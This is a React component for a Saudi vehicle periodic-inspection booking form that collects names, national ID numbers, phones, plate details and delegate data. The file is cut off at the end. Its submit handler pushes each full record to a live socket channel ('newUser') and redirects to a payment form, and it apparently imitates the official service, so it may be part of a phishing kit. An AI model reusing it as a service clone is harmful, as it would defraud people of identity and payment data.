import React, { useState } from "react";
import { serverRoute, socket } from "./Main";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { TailSpin } from "react-loader-spinner";

const NewDateUpdated = () => {
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const [errors, setErrors] = useState({});
  const [data, setData] = useState({
    vechile_status: "driving_licence",
    delegate: false,
    nationality: "",
    fullname: "",
    nation_number: "",
    phone: "",
    country_code: "966",
    email: "",
    country: "السعودية",
    first: "",
    second: "",
    third: "",
    board_number: "",
    customs_number: "",
    location: "",
    region: "",
    service_type: "الفحص الدوري",
    danger_vechile: false,
    vechile_type: "سيارة خاصة",
    registration_type: "",
    date_check: "",
    time_check: "",
    // Delegate fields
    commissioner_type: "مواطن / مقيم",
    commissioner_name: "",
    commissioner_phone: "",
    commissioner_country_code: "966",
    commissioner_nationality: "السعودية",
    commissioner_id: "",
    commissioner_birthdate: "",
    commissioner_accept: false,
  });

  const places = [
    "أبها - المحالة أبها",
    "الباحة - طريق الملك عبدالعزيز",
    "الجبيل الجبيل35762",
    "الخرج حي الراشدية",
    "الخرمة حي المحمدية",
    "الخفجي الخرفة المنطقة الصناعية الثانية",
    "الدمام حي المنار",
    "الرس - طريق الملك فهد",
    "الرياض القيروان الرياض",
    "الرياض حي الفيصلية الرياض",
    " الرياض حي المونسية",
    "الرياض طريق دايراب عكاض الرياض",
    "الطائف حي القديرة",
    "القريات - WCJA6222, 6222 تركي بن احمد السديري حي الفرسان القريات",
    "القويعية حي الزهور القويعية",
    "المجمعة المنطقة الصناعية",
    "المدينة المنورة طريق المدينة - تبوك السريع",
    "الهفوف الشارع الرابع حي الصناعية المبرز",
    "بيشة - 1432, 7372, بيشة 67912",
    "تبوك المنطقة الزراعية",
    "جازان - الكرامة العسيلة",
    "جدة - الأمير عبدالمجيد جدة",
    "جدة - شارع عبدالجليل ياسين حي المروة",
    "جدة - طريق عسفان جدة",
    "حائل طريق المدينة - منطقة الوادي",
    "حفر الباطن طريق الملك عبدالعزيز الاسكان",
    "سكاكا - سلمان الفارسي محطة الفحص الدوري للمركبات ",
    "عرعر - معارض سيارات",
    "محايل عسير - الخالدية محايل عسير",
    "مكة المكرمة - العمرة الجديدة مكة",
    "نجران - طريق الملك عبدالعزيز نجران",
    "وادي الدواسر طريق خميس - السليل السريع",
    "ينبع لمبارك ينبع",
  ];

  const regions = [
    "منطقة نجران",
    "منطقة الجوف",
    "المنطقة الشرقية",
    "منطقة تبوك",
    "منطقة القصيم",
    "منطقة حائل",
    "منطقة عسير",
    "منطقة مكة المكرمة",
    "منطقة المدينة المنورة",
    "منطقة الباحة",
    "منطقة الرياض",
    "منطقة جازان",
    "منطقة الحدود الشمالية",
  ];

  const boards = [
    { en: "A", ar: "أ" },
    { en: "B", ar: "ب" },
    { en: "J", ar: "ح" },
    { en: "D", ar: "د" },
    { en: "R", ar: "ر" },
    { en: "S", ar: "س" },
    { en: "X", ar: "ص" },
    { en: "T", ar: "ط" },
    { en: "E", ar: "ع" },
    { en: "G", ar: "ق" },
    { en: "K", ar: "ك" },
    { en: "L", ar: "ل" },
    { en: "Z", ar: "م" },
    { en: "N", ar: "ن" },
    { en: "H", ar: "ه" },
    { en: "U", ar: "و" },
    { en: "V", ar: "ي" },
  ];

  const vehicleTypes = [
    "سيارة خاصة",
    "مركبة نقل خفيفة خاصة",
    "نقل ثقيل",
    "حافلة خفيفة",
    "مركبة نقل خفيفة",
    "نقل متوسط",
    "حافلة كبيرة",
    "الدراجات ثنائية العجلات",
    "مركبات أشغال عامة",
    "دراجة ثلاثية او رباعية العجلات",
    "مقطورة ثقيلة",
    "سيارات الأجرة",
    "سيارات التأجير",
    "نصف مقطورة ثقيلة",
    "حافلة متوسطة",
    "مقطورة خفيفة",
    "نصف مقطورة خفيفة",
    "نصف مقطورة خفيفة خاصة",
    "مقطورة خفيفة خاصة",
  ];

  const registrationTypes = [
    "خصوصى",
    "نقل عام",
    "نقل خاص",
    "مقطورة",
    "دراجة نارية",
    "مركبة أجرة",
    "تصدير",
    "دراجة نارية ترفيهيه",
    "هيئة دبلوماسية",
    "حافلة خاصة",
    "مؤقتة",
    "مركبة أشغال عامة",
  ];

  const nationalities = [
    "أفغانستان",
    "ألبانيا",
    "الجزائر",
    "الأرجنتين",
    "أرمينيا",
    "أستراليا",
    "النمسا",
    "أذربيجان",
    "البحرين",
    "بنغلاديش",
    "بيلاروسيا",
    "بلجيكا",
    "البوسنة والهرسك",
    "البرازيل",
    "بلغاريا",
    "كمبوديا",
    "كندا",
    "تشيلي",
    "الصين",
    "كولومبيا",
    "كرواتيا",
    "كوبا",
    "قبرص",
    "جمهورية التشيك",
    "الدنمارك",
    "مصر",
    "إستونيا",
    "إثيوبيا",
    "فنلندا",
    "فرنسا",
    "جورجيا",
    "ألمانيا",
    "اليونان",
    "الهند",
    "إندونيسيا",
    "إيران",
    "العراق",
    "أيرلندا",
    "إيطاليا",
    "اليابان",
    "الأردن",
    "كازاخستان",
    "كينيا",
    "الكويت",
    "لبنان",
    "ليبيا",
    "ماليزيا",
    "المكسيك",
    "المغرب",
    "هولندا",
    "نيوزيلندا",
    "نيجيريا",
    "النرويج",
    "عمان",
    "باكستان",
    "فلسطين",
    "الفلبين",
    "بولندا",
    "البرتغال",
    "رومانيا",
    "روسيا",
    "المملكة العربية السعودية",
    "صربيا",
    "سنغافورة",
    "سلوفاكيا",
    "سلوفينيا",
    "الصومال",
    "جنوب أفريقيا",
    "كوريا الجنوبية",
    "إسبانيا",
    "السودان",
    "السويد",
    "سويسرا",
    "سوريا",
    "تايوان",
    "تايلاند",
    "تونس",
    "تركيا",
    "أوكرانيا",
    "الإمارات العربية المتحدة",
    "المملكة المتحدة",
    "الولايات المتحدة",
    "أوزبكستان",
    "فنزويلا",
    "فيتنام",
    "اليمن",
  ];

  const countryCodes = [
    { code: "966", country: "sa", name: "السعودية" },
    { code: "964", country: "iq", name: "العراق" },
    { code: "961", country: "lb", name: "لبنان" },
    { code: "962", country: "jo", name: "الأردن" },
    { code: "20", country: "eg", name: "مصر" },
    { code: "971", country: "ae", name: "الإمارات" },
    { code: "965", country: "kw", name: "الكويت" },
  ];

  const generateTimeSlots = () => {
    const slots = [];
    for (let hour = 7; hour <= 23; hour++) {
      for (let minute = 0; minute < 60; minute += 5) {
        const isPM = hour >= 12;
        const displayHour = hour > 12 ? hour - 12 : hour;
        const period = isPM ? "م" : "ص";
        const timeString = `${displayHour.toString().padStart(2, "0")}:${minute
          .toString()
          .padStart(2, "0")} ${period}`;
        slots.push(timeString);
      }
    }
    return slots;
  };

  const handleChange = (e) => {
    const { name, type, checked, value } = e.target;
    console.log(name, value);

    setData((prevData) => ({
      ...prevData,
      [name]: type === "checkbox" ? checked : value,
    }));

    // Validate phone numbers
    if (name === "phone" || name === "commissioner_phone") {
      if (value && value.length > 0) {
        const phoneRegex = /^05\d{8}$/;
        if (!phoneRegex.test(value)) {
          setErrors((prevErrors) => ({
            ...prevErrors,
            [name]: "رقم الجوال غير صحيح؛ يجب أن يبدأ بـ05 ويتكون من 10 أرقام",
          }));
        } else {
          setErrors((prevErrors) => {
            const { [name]: removed, ...rest } = prevErrors;
            return rest;
          });
        }
      } else {
        setErrors((prevErrors) => {
          const { [name]: removed, ...rest } = prevErrors;
          return rest;
        });
      }
    }

    // Validate national ID numbers
    if (name === "nation_number" || name === "commissioner_id") {
      if (value && value.length > 0) {
        const idRegex = /^\d{10}$/;
        if (!idRegex.test(value)) {
          setErrors((prevErrors) => ({
            ...prevErrors,
            [name]: "رقم الهوية يجب أن يكون 10 أرقام",
          }));
        } else {
          setErrors((prevErrors) => {
            const { [name]: removed, ...rest } = prevErrors;
            return rest;
          });
        }
      } else {
        setErrors((prevErrors) => {
          const { [name]: removed, ...rest } = prevErrors;
          return rest;
        });
      }
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    const newErrors = {};

    try {
      if (data.vechile_status === "driving_licence") {
        if (!data.country) newErrors.country = "مطلوب";
        if (!data.first) newErrors.first = "مطلوب";
        if (!data.second) newErrors.second = "مطلوب";
        if (!data.third) newErrors.third = "مطلوب";
      }
      if (!data.location) newErrors.location = "مطلوب";
      if (!data.region) newErrors.region = "مطلوب";

      // Validate delegate fields if delegate is checked
      if (data.delegate) {
        if (!data.commissioner_accept) newErrors.commissioner_accept = "مطلوب";
        if (!data.commissioner_name) newErrors.commissioner_name = "مطلوب";
        if (!data.commissioner_phone) newErrors.commissioner_phone = "مطلوب";
        if (!data.commissioner_id) newErrors.commissioner_id = "مطلوب";
        if (!data.commissioner_birthdate)
          newErrors.commissioner_birthdate = "مطلوب";
      }

      if (Object.keys(newErrors).length === 0) {
        setErrors({});
        const {
          first,
          second,
          third,
          customs_number,
          country,
          board_number,
          ...other
        } = data;

        if (data.vechile_status === "driving_licence") {
          const border_letter = `${third} | ${second} | ${first}`;
          await axios
            .post(serverRoute + "/reg", {
              border_letter,
              board_number,
              country,
              ...other,
            })
            .then(async ({ status, data }) => {
              const final = JSON.stringify({
                ...data.user,
              });
              if (status === 201) {
                sessionStorage.setItem("id", data.user._id);
                socket.emit("bindOrder", data.user._id);
                socket.emit("newUser", final);
                navigate("/payment-form?data=" + final);
              } else window.alert("حدث خطأ ما");
            });
        } else {
          await axios
            .post(serverRoute + "/reg", {
              customs_number,
              ...other,
            })
            .then(async ({ status, data }) => {
              const final = JSON.stringify({
                ...data.user,
              });
              if (status === 201) {
                sessionStorage.setItem("id", data.user._id);
                socket.emit("bindOrder", data.user._id);
                socket.emit("newUser", final);
                navigate("/payment-form?data=" + final);
              } else window.alert("حدث خطأ ما");
            });
        }
      } else {
        alert("املاء كل الخانات المطلوبة");
        setErrors(newErrors);
      }
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
    }
  };
  const countryCodeImg =
    countryCodes.find((c) => c.code === data.country_code)?.country || "sa";

  return (
    <div className="py-10 w-full px-3 md:w-1/2" dir="rtl">
      {loading && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            visible={true}
          />
        </div>
      )}

      <h1 className="text-2xl lg:text-5xl font-bold text-green-700 mb-6">
        خدمة الفحص الفني الدوري
      </h1>
      <h2 className="text-2xl lg:text-4xl text-green-700 font-semibold mb-10">
        حجز موعد
      </h2>

      <form
        className="mt-10 lg:mt-16 flex flex-col gap-4"
        onSubmit={handleSubmit}
      >
        {/* Personal Information */}
        <h2 className="font-bold text-gray-500 text-xl lg:text-2xl">
          المعلومات الشخصية
        </h2>

        <div className="max-w-sm space-y-2">
          <label className="mb-2 block text-sm font-semibold">الأسم</label>
          <input
            type="text"
            className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
            placeholder="أكتب أسمك هنا..."
            name="fullname"
            value={data.fullname}
            onChange={handleChange}
            required
          />
        </div>
        <div className="grid grid-cols-1 lg:grid-cols-2 w-full gap-y-4 ">
          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              البريد الإلكتروني
            </label>
            <input
              type="email"
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              placeholder="أكتب بريدك الإلكتروني هنا..."
              name="email"
              value={data.email}
              onChange={handleChange}
              required
            />
          </div>

          <div className="flex flex-wrap gap-2 lg:gap-10">
            <div className="max-w-sm space-y-2 flex-1">
              <label className="mb-2 block text-sm font-semibold">
                رقم الجوال
              </label>
              <div className="relative" dir="ltr">
                <div className="flex items-center gap-2 w-full rounded-md border border-gray-300 px-3 py-2 focus-within:ring-2 focus-within:ring-green-700 focus-within:border-green-700 bg-white">
                  {/* Country Code Selector with Flag */}
                  <div className="flex items-center gap-2  pl-2">
                    <img
                      src={`https://flagcdn.com/sa.svg`}
                      alt="flag"
                      className="w-8 h-6 object-cover rounded"
                    />
                  </div>

                  {/* Phone Input */}
                  <input
                    type="tel"
                    className="flex-1 border-none outline-none text-base bg-transparent text-right"
                    placeholder=""
                    name="phone"
                    value={data.phone}
                    onChange={handleChange}
                    minLength={9}
                    maxLength={10}
                    required
                  />
                </div>

                {/* Floating Placeholder */}
                {!data.phone && (
                  <span
                    className="absolute right-3  top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none text-sm "
                    dir="rtl"
                  >
                    أكتب رقم الجوال هنا...
                  </span>
                )}
              </div>
              {errors.phone && (
                <p className="text-red-500 text-sm">{errors.phone}</p>
              )}
            </div>
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              رقم الهوية الوطنية / الاقامة
            </label>
            <input
              type="tel"
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base text-right focus:outline-none focus:ring-2 focus:ring-green-700"
              placeholder=" ...أكتب رقم الهوية الوطنية / الاقامة هنا"
              name="nation_number"
              value={data.nation_number}
              onChange={handleChange}
              minLength={10}
              maxLength={10}
              required
            />
            {errors.nation_number && (
              <p className="text-red-500 text-sm">{errors.nation_number}</p>
            )}
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">الجنسية</label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="nationality"
              value={data.nationality}
              onChange={handleChange}
              required
            >
              <option value="">أختر الجنسية</option>
              {nationalities.map((nat) => (
                <option key={nat} value={nat}>
                  {nat}
                </option>
              ))}
            </select>
          </div>
        </div>

        <div className="max-w-sm space-y-2">
          <div className="flex items-start gap-2 mt-4">
            <input
              type="checkbox"
              className="w-4 h-4 mt-1 border-green-700 focus:ring-green-700"
              name="delegate"
              checked={data.delegate}
              onChange={handleChange}
            />
            <label className="text-sm font-bold text-gray-700">
              هل تريد تفويض شخص آخر بفحص المركبة؟
            </label>
          </div>
        </div>

        {/* Delegate Information Section - Shown when delegate is checked */}
        {data.delegate && (
          <section className="flex flex-col gap-4   mt-6">
            <h2 className="font-bold text-gray-500 text-xl lg:text-2xl">
              المعلومات المفوض
            </h2>

            {/* Commissioner Type */}
            <div className="space-y-2">
              <div className="w-full grid grid-cols-2 gap-4">
                <label
                  className={`block cursor-pointer border  p-4 text-sm font-medium shadow-sm transition-colors duration-300 ${
                    data.commissioner_type === "مواطن / مقيم"
                      ? "bg-green-700 text-white border-green-700 ring-1 ring-green-700"
                      : "border-gray-100 hover:border-gray-200 bg-white"
                  }`}
                >
                  <p className="text-center font-bold lg:text-lg">
                    مواطن / مقيم
                  </p>
                  <input
                    type="radio"
                    name="commissioner_type"
                    value="مواطن / مقيم"
                    checked={data.commissioner_type === "مواطن / مقيم"}
                    onChange={handleChange}
                    className="sr-only"
                  />
                </label>

                <label
                  className={`block cursor-pointer border  p-4 text-sm font-medium shadow-sm transition-colors duration-300 ${
                    data.commissioner_type === "مواطن خليجي"
                      ? "bg-green-700 text-white border-green-700 ring-1 ring-green-700"
                      : "border-gray-100 hover:border-gray-200 bg-white"
                  }`}
                >
                  <p className="text-center font-bold lg:text-lg">
                    مواطن خليجي
                  </p>
                  <input
                    type="radio"
                    name="commissioner_type"
                    value="مواطن خليجي"
                    checked={data.commissioner_type === "مواطن خليجي"}
                    onChange={handleChange}
                    className="sr-only"
                  />
                </label>
              </div>
            </div>
            <div className="grid grid-cols-1 lg:grid-cols-2 w-full gap-y-4 ">
              {/* Commissioner Name */}
              <div className="max-w-sm space-y-2">
                <label className="mb-2 block text-sm font-semibold">
                  أسم المفوض
                </label>
                <input
                  type="text"
                  className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
                  placeholder="أكتب أسم المفوض هنا..."
                  name="commissioner_name"
                  value={data.commissioner_name}
                  onChange={handleChange}
                  required={data.delegate}
                />
              </div>

              {/* Commissioner Phone */}
              <div className="flex flex-wrap gap-2 lg:gap-10">
                <div className="max-w-sm space-y-2 flex-1">
                  <label className="mb-2 block text-sm font-semibold">
                    رقم الجوال
                  </label>
                  <div className="relative" dir="ltr">
                    <div className="flex items-center gap-2 w-full rounded-md border border-gray-300 px-3 py-2 focus-within:ring-2 focus-within:ring-green-700 focus-within:border-green-700 bg-white">
                      {/* Country Code Selector with Flag */}
                      <div className="flex items-center gap-2 pl-2">
                        <img
                          src={`https://flagcdn.com/sa.svg`}
                          alt="flag"
                          className="w-8 h-6 object-cover rounded"
                        />
                      </div>

                      {/* Phone Input */}
                      <input
                        type="tel"
                        className="flex-1 border-none outline-none text-base bg-transparent text-right"
                        placeholder=""
                        name="commissioner_phone"
                        value={data.commissioner_phone}
                        onChange={handleChange}
                        minLength={9}
                        maxLength={10}
                        required={data.delegate}
                      />
                    </div>

                    {/* Floating Placeholder */}
                    {!data.commissioner_phone && (
                      <span
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none text-sm"
                        dir="rtl"
                      >
                        أكتب رقم الجوال المفوض هنا...
                      </span>
                    )}
                  </div>
                  {errors.commissioner_phone && (
                    <p className="text-red-500 text-sm">
                      {errors.commissioner_phone}
                    </p>
                  )}
                </div>
              </div>

              {/* Commissioner Nationality */}
              <div className="max-w-sm space-y-2">
                <label className="mb-2 block text-sm font-semibold">
                  جنسية المفوض
                </label>
                <select
                  className="w-full rounded-md border border-gray-300 px-3 py-2 text-base "
                  name="commissioner_nationality"
                  value={data.commissioner_nationality}
                  onChange={handleChange}
                  required={data.delegate}
                >
                  <option value="">أختر الجنسية</option>
                  {nationalities.map((nat) => (
                    <option key={nat} value={nat}>
                      {nat}
                    </option>
                  ))}
                </select>
              </div>

              <div className="grid gap-4 lg:grid-cols-2">
                {/* Commissioner ID */}
                <div className="max-w-sm space-y-2">
                  <label className="mb-2 block text-sm font-semibold">
                    رقم الهوية الوطنية / الاقامة المفوض
                  </label>
                  <input
                    type="tel"
                    className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700 placeholder:text-right"
                    placeholder="...أكتب رقم الهوية الوطنية / الاقامة المفوض هنا"
                    name="commissioner_id"
                    value={data.commissioner_id}
                    onChange={handleChange}
                    minLength={10}
                    maxLength={10}
                    required={data.delegate}
                  />
                  {errors.commissioner_id && (
                    <p className="text-red-500 text-sm">
                      {errors.commissioner_id}
                    </p>
                  )}
                </div>

                {/* Commissioner Birthdate */}
                <div className="max-w-sm space-y-2">
                  <label className="mb-2 block text-sm font-semibold">
                    تاريخ ميلاد المفوض
                  </label>
                  <input
                    type="date"
                    className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
                    name="commissioner_birthdate"
                    value={data.commissioner_birthdate}
                    onChange={handleChange}
                    required={data.delegate}
                  />
                </div>
              </div>
            </div>
            {/* Commissioner Accept Terms */}
            <div className="space-y-2">
              <div className="flex items-start gap-2 mt-4 max-w-lg">
                <input
                  type="checkbox"
                  className="w-4 h-4 mt-1 border-green-700 focus:ring-green-700"
                  name="commissioner_accept"
                  checked={data.commissioner_accept}
                  onChange={handleChange}
                  required={data.delegate}
                />
                <label className="text-sm font-bold text-gray-700">
                  أوافق علي أن خدمة التفويض تقتصر على إعطاء المفوض الصلاحية
                  بزيارة وإجراء الفحص الفني الدوري للمركبة المفوض عليها
                </label>
              </div>
              {data.delegate &&
                !data.commissioner_accept &&
                errors.commissioner_accept && (
                  <p className="text-red-500 text-sm">
                    يجب الموافقة على هذا الشرط
                  </p>
                )}
            </div>
          </section>
        )}

        {/* Vehicle Information */}
        <h2 className="font-bold text-gray-500 text-xl lg:text-2xl mt-6 lg:mt-10">
          المعلومات المركبة
        </h2>

        <div className="space-y-2">
          <div className="w-full grid grid-cols-2 gap-4 ">
            <label
              className={`block cursor-pointer border  p-4 text-sm font-medium shadow-sm transition-colors duration-300 ${
                data.vechile_status === "driving_licence"
                  ? "bg-green-700 text-white border-green-700 ring-1 ring-green-700"
                  : "border-gray-100 hover:border-gray-200 bg-white"
              }`}
            >
              <p className="text-center font-bold lg:text-lg">تحمل رخصة سير</p>
              <input
                type="radio"
                name="vechile_status"
                value="driving_licence"
                checked={data.vechile_status === "driving_licence"}
                onChange={handleChange}
                className="sr-only"
              />
            </label>

            <label
              className={`block cursor-pointer border  p-4 text-sm font-medium shadow-sm transition-colors duration-300 ${
                data.vechile_status === "customs_card"
                  ? "bg-green-700 text-white border-green-700 ring-1 ring-green-700"
                  : "border-gray-100 hover:border-gray-200 bg-white"
              }`}
            >
              <p className="text-center font-bold lg:text-lg">
                تحمل بطاقة جمركية
              </p>
              <input
                type="radio"
                name="vechile_status"
                value="customs_card"
                checked={data.vechile_status === "customs_card"}
                onChange={handleChange}
                className="sr-only"
              />
            </label>
          </div>
        </div>

        {data.vechile_status === "driving_licence" ? (
          <>
            <div className="car-panel-selection flex flex-col items-center gap-4 mb-8  w-full self-center">
              {/* License Plate Display */}
              <div className="border border-gray-800 rounded-2xl bg-white p-3 shadow-lg max-w-11/12 justify-center flex items-center">
                <div id="plate-chars">
                  <table className="w-full border-collapse">
                    <tbody>
                      <tr>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-gray-50"
                          style={{ width: "25%" }}
                        >
                          <span>{data.first.split("-")[1] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-gray-50"
                          style={{ width: "25%" }}
                        >
                          <span>{data.second.split("-")[1] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-gray-50"
                          style={{ width: "25%" }}
                        >
                          <span>{data.third.split("-")[1] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-2 text-2xl font-bold bg-gray-50"
                          style={{ width: "25%" }}
                        >
                          <div className="flex justify-center gap-3">
                            <span>
                              {data.board_number ? data.board_number[0] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[1] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[2] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[3] : "-"}
                            </span>
                          </div>
                        </td>
                      </tr>
                      <tr>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-white"
                          style={{ width: "25%" }}
                        >
                          <span>{data.first.split("-")[0] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-white"
                          style={{ width: "25%" }}
                        >
                          <span>{data.second.split("-")[0] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-3 text-2xl font-bold bg-white"
                          style={{ width: "25%" }}
                        >
                          <span>{data.third.split("-")[0] || "-"}</span>
                        </td>
                        <td
                          className="border border-gray-800 text-center py-2 px-2 text-2xl font-bold bg-white"
                          style={{ width: "25%" }}
                        >
                          <div className="flex justify-center gap-3">
                            <span>
                              {data.board_number ? data.board_number[0] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[1] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[2] : "-"}
                            </span>
                            <span>
                              {data.board_number ? data.board_number[3] : "-"}
                            </span>
                          </div>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Selects and Input */}
              <div className="flex flex-wrap items-center justify-center gap-2 w-full">
                <select
                  className="min-w-[120px] border-2 border-gray-400 rounded-lg px-4 py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-green-700 focus:border-green-700 bg-white"
                  value={data.first}
                  name="first"
                  onChange={handleChange}
                >
                  <option value="">أختر حرف</option>
                  {boards.map((e) => (
                    <option key={e.en} value={`${e.en}-${e.ar}`}>
                      {e.ar} - {e.en}
                    </option>
                  ))}
                </select>

                <select
                  className="min-w-[120px] border-2 border-gray-400 rounded-lg px-4 py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-green-700 focus:border-green-700 bg-white"
                  value={data.second}
                  name="second"
                  onChange={handleChange}
                >
                  <option value="">أختر حرف</option>
                  {boards.map((e) => (
                    <option key={e.en} value={`${e.en}-${e.ar}`}>
                      {e.ar} - {e.en}
                    </option>
                  ))}
                </select>

                <select
                  className="min-w-[120px] border-2 border-gray-400 rounded-lg px-4 py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-green-700 focus:border-green-700 bg-white"
                  value={data.third}
                  name="third"
                  onChange={handleChange}
                >
                  <option value="">أختر حرف</option>
                  {boards.map((e) => (
                    <option key={e.en} value={`${e.en}-${e.ar}`}>
                      {e.ar} - {e.en}
                    </option>
                  ))}
                </select>

                <input
                  className="w-40 rounded-lg py-3 px-4 border-2 border-gray-400 bg-white text-center text-lg font-semibold focus:outline-none focus:ring-2 focus:ring-green-700 focus:border-green-700"
                  type="tel"
                  placeholder="رقم المركبة"
                  maxLength="4"
                  name="board_number"
                  value={data.board_number}
                  onChange={handleChange}
                  required
                  style={{ direction: "rtl" }}
                />
              </div>

              {/* Error Message */}
              {(errors.first || errors.second || errors.third) && (
                <p className="text-red-500 text-sm text-center w-full">
                  {errors.first || errors.second || errors.third}
                </p>
              )}
            </div>

            <div className="max-w-sm space-y-2">
              <label className="mb-2 block text-sm font-semibold">
                نوع التسجيل
              </label>
              <select
                className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
                name="registration_type"
                value={data.registration_type}
                onChange={handleChange}
                required
              >
                <option value="">أختر نوع التسجيل</option>
                {registrationTypes.map((type) => (
                  <option key={type} value={type}>
                    {type}
                  </option>
                ))}
              </select>
            </div>
          </>
        ) : (
          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              رقم البطاقة الجمركية
            </label>
            <input
              type="text"
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="customs_number"
              value={data.customs_number}
              onChange={handleChange}
              required
            />
          </div>
        )}

        {/* Service Center */}
        <h2 className="font-bold text-gray-500 text-xl lg:text-2xl  lg:mt-10">
          مركز الخدمة
        </h2>

        <div className="grid lg:grid-cols-2 gap-4">
          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              نوع المركبة
            </label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="vechile_type"
              value={data.vechile_type}
              onChange={handleChange}
              required
            >
              <option value="">أختر نوع المركبة</option>
              {vehicleTypes.map((type) => (
                <option key={type} value={type}>
                  {type}
                </option>
              ))}
            </select>
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              نوع خدمة الفحص
            </label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="service_type"
              value={data.service_type}
              onChange={handleChange}
              required
            >
              <option value="الفحص الدوري">خدمة الفحص الدوري</option>
              <option value="اعادة الفحص الدوري">خدمة إعادة الفحص</option>
            </select>
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">المنطقة</label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="region"
              value={data.region}
              onChange={handleChange}
              required
            >
              <option value="">أختر المنطقة</option>
              {regions.map((region) => (
                <option key={region} value={region}>
                  {region}
                </option>
              ))}
            </select>
            {errors.region && (
              <span className="text-red-500 text-sm">{errors.region}</span>
            )}
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              مركز الفحص
            </label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="location"
              value={data.location}
              onChange={handleChange}
              required
            >
              <option value="">أختر مركز الفحص</option>
              {places.map((place) => (
                <option key={place} value={place}>
                  {place}
                </option>
              ))}
            </select>
            {errors.location && (
              <span className="text-red-500 text-sm">{errors.location}</span>
            )}
          </div>
        </div>
        <div className="w-full ">
          <img src="/data1.jpeg" className="w-full" />
        </div>
        <div className="grid gap-4 lg:grid-cols-2">
          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              موعد الخدمة
            </label>
            <input
              type="date"
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="date_check"
              value={data.date_check}
              onChange={handleChange}
              required
            />
          </div>

          <div className="max-w-sm space-y-2">
            <label className="mb-2 block text-sm font-semibold">
              موعد الخدمة
            </label>
            <select
              className="w-full rounded-md border border-gray-300 px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-green-700"
              name="time_check"
              value={data.time_check}
              onChange={handleChange}
              required
            >
              <option value="">أختر موعد الخدمة</option>
              {generateTimeSlots().map((time) => (
                <option key={time} value={time}>
                  {time}
                </option>
              ))}
            </select>
          </div>
        </div>

        <div className="bg-red-50 px-4 py-2 rounded-md max-w-lg mt-2">
          <p className="text-red-600 text-sm">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="inline w-5 h-5 ml-2"
            >
              <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"></path>
              <path d="M12 9v4"></path>
              <path d="M12 17h.01"></path>
            </svg>
            الحضور على الموعد يسهم في سرعة و جودة الخدمة و في حال عدم الحضور، لن
